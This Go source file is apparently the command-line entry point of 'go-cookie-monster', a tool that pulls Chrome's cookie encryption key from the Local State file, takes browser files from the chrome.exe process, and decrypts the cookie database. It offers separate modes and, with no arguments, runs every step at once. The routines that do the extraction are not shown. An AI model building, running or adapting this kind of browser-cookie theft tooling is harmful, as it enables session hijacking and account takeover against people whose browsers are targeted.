package cookiemonster

import (
	"flag"
	"fmt"
	"os"
)

func ModeExecute() {
	if len(os.Args) > 1 {
		var (
			//browserName        string
			localStateFilePath string
			outputDir          string
			databasePath       string
			key                string
		)
		mode := os.Args[1]

		// Define flags that can be used for any mode
		//pid := flag.Int("pid", 0, "process ID to analyze (used in 'files' and 'all' modes)")
		//flag.StringVar(&browserName, "browser", "chrome", "browser name")
		flag.StringVar(&localStateFilePath, "statefile", "", "path to the Local State file (used in 'keys' mode)")
		flag.StringVar(&outputDir, "outputdir", "", "output directory for files (used in 'files' mode)")
		flag.StringVar(&key, "key", "", "decryption key (required in 'cookies' mode)")
		flag.StringVar(&databasePath, "dbpath", "", "path to the database (required in 'cookies' mode)")

		// Parse all flags starting from the second argument
		flag.CommandLine.Parse(os.Args[2:])

		switch mode {
		case "keys":
			ProcessKeysMode(localStateFilePath)
		case "files":
			ProcessFileMode("chrome.exe", outputDir, true)
		case "cookies":
			ProcessCookiesMode(key, databasePath, nil)
		case "logindata":
			fmt.Println("Login Data")
		case "all":
			fmt.Println("All")

			ExecuteAllModes(localStateFilePath, "chrome.exe", outputDir)
		default:
			fmt.Println("Help")
			fmt.Println("Usage: go-cookie-monster [all|keys|files|cookies|logindata]")
			os.Exit(1)
		}
	} else {
		ExecuteAllModes("", "chrome.exe", "")
	}
}

func ExecuteAllModes(localStateFilePath, browserName, outputDir string) {
	key := ProcessKeysMode(localStateFilePath)

	browserFiles := ProcessFileMode(browserName, outputDir, false)

	ProcessCookiesMode(key, "", browserFiles.Cookies.Data)
}
